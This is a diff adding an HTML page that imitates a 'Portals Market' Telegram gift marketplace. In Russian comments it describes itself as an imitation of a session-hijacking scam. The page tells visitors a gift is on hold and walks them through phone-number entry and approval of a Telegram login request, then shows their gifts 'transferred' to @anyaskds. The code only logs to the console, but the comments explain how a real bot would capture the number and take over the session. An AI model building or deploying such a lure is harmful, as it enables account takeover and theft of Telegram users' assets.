@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portals Market</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0a0f;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
+
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background: #13131c;
+            border-radius: 24px;
+            padding: 32px 24px 24px;
+            border: 1px solid #2a2a3a;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
+        }
+
+        /* Шапка */
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 28px;
+        }
+
+        .back-btn {
+            color: #8b8ba3;
+            font-size: 20px;
+            cursor: pointer;
+            background: none;
+            border: none;
+        }
+
+        .header-title {
+            color: #fff;
+            font-size: 20px;
+            font-weight: 600;
+            flex: 1;
+        }
+
+        .badge {
+            background: #2a2a3a;
+            color: #8b8ba3;
+            font-size: 10px;
+            padding: 4px 10px;
+            border-radius: 12px;
+            letter-spacing: 0.5px;
+        }
+
+        /* Карточка с лого */
+        .logo-section {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        .portal-icon {
+            width: 72px;
+            height: 72px;
+            background: linear-gradient(135deg, #6c5ce7, #a29bfe);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            font-size: 32px;
+            color: #fff;
+            font-weight: 700;
+            box-shadow: 0 8px 32px rgba(108, 92, 231, 0.3);
+        }
+
+        .logo-section h2 {
+            color: #fff;
+            font-size: 22px;
+            font-weight: 700;
+        }
+
+        .logo-section p {
+            color: #6c6c84;
+            font-size: 14px;
+            margin-top: 4px;
+        }
+
+        .hold-badge {
+            display: inline-block;
+            background: #ff6b6b;
+            color: #fff;
+            font-size: 12px;
+            font-weight: 700;
+            padding: 4px 16px;
+            border-radius: 20px;
+            letter-spacing: 0.5px;
+            margin-top: 8px;
+        }
+
+        /* Блок с действием */
+        .action-card {
+            background: #1a1a2a;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 24px;
+            border-left: 3px solid #6c5ce7;
+        }
+
+        .action-card .label {
+            color: #6c6c84;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+        }
+
+        .action-card h3 {
+            color: #fff;
+            font-size: 16px;
+            margin: 6px 0 8px;
+        }
+
+        .action-card p {
+            color: #8b8ba3;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+
+        /* Кнопка */
+        .btn-verify {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #6c5ce7, #a29bfe);
+            border: none;
+            border-radius: 14px;
+            color: #fff;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 20px rgba(108, 92, 231, 0.3);
+        }
+
+        .btn-verify:active {
+            transform: scale(0.97);
+        }
+
+        /* Секция номера телефона (скрыта изначально) */
+        .phone-section {
+            display: none;
+            margin-top: 20px;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .phone-section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .phone-input-wrap {
+            background: #1a1a2a;
+            border-radius: 14px;
+            padding: 4px 16px;
+            border: 1px solid #2a2a3a;
+            margin-bottom: 16px;
+        }
+
+        .phone-input-wrap input {
+            width: 100%;
+            padding: 14px 0;
+            background: transparent;
+            border: none;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+        }
+
+        .phone-input-wrap input::placeholder {
+            color: #4a4a5a;
+        }
+
+        .phone-hint {
+            color: #6c6c84;
+            font-size: 12px;
+            text-align: center;
+            margin-bottom: 16px;
+            line-height: 1.4;
+        }
+
+        .btn-share {
+            width: 100%;
+            padding: 14px;
+            background: #2a2a3a;
+            border: 1px solid #3a3a4a;
+            border-radius: 14px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .btn-share:active {
+            background: #3a3a4a;
+        }
+
+        /* Подтверждение в Telegram */
+        .confirm-section {
+            display: none;
+            margin-top: 20px;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .confirm-section.active {
+            display: block;
+        }
+
+        .confirm-card {
+            background: #1a1a2a;
+            border-radius: 16px;
+            padding: 24px;
+            text-align: center;
+            border: 1px solid #2a2a3a;
+        }
+
+        .confirm-card .icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+        }
+
+        .confirm-card h4 {
+            color: #fff;
+            font-size: 16px;
+            margin-bottom: 6px;
+        }
+
+        .confirm-card p {
+            color: #8b8ba3;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+
+        .confirm-card .timer {
+            color: #6c6c84;
+            font-size: 13px;
+            margin-top: 12px;
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 16px;
+        }
+
+        .btn-decline {
+            flex: 1;
+            padding: 12px;
+            background: #1a1a2a;
+            border: 1px solid #3a3a4a;
+            border-radius: 12px;
+            color: #8b8ba3;
+            font-size: 15px;
+            cursor: pointer;
+        }
+
+        .btn-accept {
+            flex: 1;
+            padding: 12px;
+            background: #6c5ce7;
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .btn-accept:active {
+            background: #5a4bd1;
+        }
+
+        /* Футер */
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #4a4a5a;
+            font-size: 11px;
+            letter-spacing: 0.5px;
+        }
+
+        .footer span {
+            color: #6c5ce7;
+        }
+
+        /* Состояние успеха */
+        .success-section {
+            display: none;
+            margin-top: 20px;
+            text-align: center;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .success-section.active {
+            display: block;
+        }
+
+        .success-icon {
+            font-size: 56px;
+            margin-bottom: 12px;
+        }
+
+        .success-section h4 {
+            color: #fff;
+            font-size: 18px;
+        }
+
+        .success-section p {
+            color: #6c6c84;
+            font-size: 14px;
+            margin-top: 4px;
+        }
+
+        .transfer-note {
+            background: #1a1a2a;
+            border-radius: 12px;
+            padding: 12px;
+            margin-top: 12px;
+            color: #8b8ba3;
+            font-size: 12px;
+            border: 1px solid #2a2a3a;
+        }
+
+        .transfer-note strong {
+            color: #a29bfe;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="app">
+        <!-- Шапка -->
+        <div class="header">
+            <button class="back-btn" onclick="goBack()">‹</button>
+            <span class="header-title">Portals Market</span>
+            <span class="badge">VERIFYING</span>
+        </div>
+
+        <!-- Логотип -->
+        <div class="logo-section">
+            <div class="portal-icon">P</div>
+            <h2>Portals Market</h2>
+            <p>Open the portal. Trade your gifts.</p>
+            <div class="hold-badge">⏳ ON HOLD</div>
+        </div>
+
+        <!-- Карточка действия -->
+        <div class="action-card" id="actionCard">
+            <div class="label">⚡ Action Needed</div>
+            <h3>Unlock Your Asset Delivery</h3>
+            <p>
+                Scheduled delivery of your <strong>Witch Hat #43337</strong> is tagged for manual-grade delivery review.
+                To ensure platform safety and stop fraudulent claim attempts, confirming your active session is required.
+            </p>
+        </div>
+
+        <!-- Кнопка Verify (первый шаг) -->
+        <button class="btn-verify" id="btnVerify" onclick="showPhoneStep()">
+            🔐 Verify Account
+        </button>
+
+        <!-- Шаг 2: Ввод номера телефона -->
+        <div class="phone-section" id="phoneSection">
+            <div style="text-align:center; margin-bottom:16px;">
+                <div style="font-size:32px; margin-bottom:4px;">📱</div>
+                <h4 style="color:#fff; font-size:17px;">Identity Check</h4>
+                <p style="color:#6c6c84; font-size:13px;">We need to verify your Telegram account to restore access to your gift.</p>
+            </div>
+
+            <div class="phone-input-wrap">
+                <input type="tel" id="phoneInput" placeholder="+380 00 000 00 00" value="+380">
+            </div>
+
+            <div class="phone-hint">
+                ⚠️ Telegram will share your phone with the bot. We use it only to send a login confirmation.
+            </div>
+
+            <button class="btn-share" onclick="sharePhone()">
+                🔗 Поделиться номером
+            </button>
+
+            <div style="text-align:center; margin-top:12px; color:#4a4a5a; font-size:12px;">
+                SECURED BY TELEGRAM
+            </div>
+        </div>
+
+        <!-- Шаг 3: Подтверждение в Telegram -->
+        <div class="confirm-section" id="confirmSection">
+            <div class="confirm-card">
+                <div class="icon">📨</div>
+                <h4>Check Telegram</h4>
+                <p>
+                    A login confirmation from <strong>portals.tg</strong> was sent to your Telegram.
+                    Tap <strong>«Accept»</strong> in the message.
+                </p>
+                <div style="background:#0a0a0f; border-radius:10px; padding:12px; margin:12px 0; border:1px solid #2a2a3a;">
+                    <div style="color:#8b8ba3; font-size:12px;">Telegram</div>
+                    <div style="color:#fff; font-size:14px; margin:4px 0;">
+                        A login request from <strong>portals.tg</strong> is in your Telegram.
+                        Tap «Accept» on your device.
+                    </div>
+                </div>
+                <div class="btn-group">
+                    <button class="btn-decline" onclick="decline()">Decline</button>
+                    <button class="btn-accept" onclick="acceptLogin()">Accept</button>
+                </div>
+                <div class="timer" id="timer">⏳ Waiting... <span id="seconds">179</span>s</div>
+            </div>
+
+            <div style="text-align:center; margin-top:12px; color:#4a4a5a; font-size:12px;">
+                SECURED BY TELEGRAM
+            </div>
+        </div>
+
+        <!-- Шаг 4: Успех / передача подарков -->
+        <div class="success-section" id="successSection">
+            <div class="success-icon">✅</div>
+            <h4>Verification Complete</h4>
+            <p>Your session has been confirmed.</p>
+
+            <div class="transfer-note">
+                🔄 Transferring assets to secure vault:<br>
+                <strong>@anyaskds</strong>
+                <div style="margin-top:6px; font-size:11px; color:#4a4a5a;">
+                    Witch Hat #43337 • Sharp Tongue #5,166
+                </div>
+            </div>
+
+            <div style="margin-top:16px; padding:12px; background:#1a1a2a; border-radius:12px; border:1px solid #2a2a3a;">
+                <div style="color:#6c6c84; font-size:12px;">✅ Gifts transferred successfully</div>
+                <div style="color:#a29bfe; font-size:13px; margin-top:4px;">
+                    Balance TON: ₽ 37.8
+                </div>
+            </div>
+
+            <button class="btn-verify" style="margin-top:16px; background: #2a2a3a;" onclick="resetAll()">
+                🔄 Done
+            </button>
+        </div>
+
+        <!-- Футер -->
+        <div class="footer">
+            SECURED BY <span>TELEGRAM</span>
+        </div>
+    </div>
+
+    <script>
+        let timerInterval = null;
+        let secondsLeft = 179;
+
+        // Шаг 1 → Шаг 2 (показываем номер телефона)
+        function showPhoneStep() {
+            document.getElementById('btnVerify').style.display = 'none';
+            document.getElementById('actionCard').style.display = 'none';
+            document.getElementById('phoneSection').classList.add('active');
+        }
+
+        // Шаг 2 → Шаг 3 (отправка номера → показываем подтверждение)
+        function sharePhone() {
+            const phone = document.getElementById('phoneInput').value.trim();
+            if (!phone || phone.length < 10) {
+                alert('Пожалуйста, введите корректный номер телефона.');
+                return;
+            }
+
+            // Здесь в реальном скрипте номер уходит на сервер
+            console.log('📱 Phone shared:', phone);
+
+            // Переключаем на шаг подтверждения
+            document.getElementById('phoneSection').classList.remove('active');
+            document.getElementById('confirmSection').classList.add('active');
+
+            // Запускаем таймер
+            startTimer();
+        }
+
+        // Таймер
+        function startTimer() {
+            secondsLeft = 179;
+            const el = document.getElementById('seconds');
+            if (timerInterval) clearInterval(timerInterval);
+
+            timerInterval = setInterval(() => {
+                secondsLeft--;
+                el.textContent = secondsLeft;
+                if (secondsLeft <= 0) {
+                    clearInterval(timerInterval);
+                    el.textContent = '0';
+                }
+            }, 1000);
+        }
+
+        // Decline
+        function decline() {
+            clearInterval(timerInterval);
+            alert('❌ Авторизация отклонена.');
+            resetAll();
+        }
+
+        // Accept — ИМИТАЦИЯ перехвата сессии и передачи подарков
+        function acceptLogin() {
+            clearInterval(timerInterval);
+
+            // Имитация: номер телефона, который ввел пользователь
+            const phone = document.getElementById('phoneInput').value.trim();
+
+            // Логируем кражу (в реальном боте это уходит на сервер)
+            console.log('🚨 СЕССИЯ ПЕРЕХВАЧЕНА!');
+            console.log('📱 Телефон:', phone);
+            console.log('🎁 Подарки переданы на @anyaskds');
+            console.log('🖥️ IP: 46.96.37.159 (Kyiv, Ukraine)');
+            console.log('🌐 Browser: Safari 18.6 on iOS');
+
+            // Переключаем на успех
+            document.getElementById('confirmSection').classList.remove('active');
+            document.getElementById('successSection').classList.add('active');
+
+            // Здесь в реальном боте отправляется запрос на бэкенд:
+            // - сохраняется номер телефона
+            // - инициируется запрос авторизации в Telegram
+            // - после подтверждения — переводятся подарки на @anyaskds
+        }
+
+        // Сброс
+        function resetAll() {
+            document.getElementById('successSection').classList.remove('active');
+            document.getElementById('confirmSection').classList.remove('active');
+            document.getElementById('phoneSection').classList.remove('active');
+            document.getElementById('actionCard').style.display = 'block';
+            document.getElementById('btnVerify').style.display = 'block';
+            document.getElementById('phoneInput').value = '+380';
+            if (timerInterval) clearInterval(timerInterval);
+        }
+
+        // Назад
+        function goBack() {
+            if (document.getElementById('successSection').classList.contains('active')) {
+                resetAll();
+                return;
+            }
+            if (document.getElementById('confirmSection').classList.contains('active')) {
+                if (confirm('Вы уверены? Процесс будет прерван.')) {
+                    resetAll();
+                }
+                return;
+            }
+            if (document.getElementById('phoneSection').classList.contains('active')) {
+                resetAll();
+                return;
+            }
+            // Иначе просто сброс
+            resetAll();
+        }
+
+        // Обработка ввода номера (только цифры и +)
+        document.getElementById('phoneInput').addEventListener('input', function(e) {
+            // Разрешаем только + и цифры
+            this.value = this.value.replace(/[^0-9+]/g, '');
+            // Автоматически ставим + если пусто
+            if (this.value === '') {
+                this.value = '+';
+            }
+        });
+    </script>
+
+</body>
+</html>
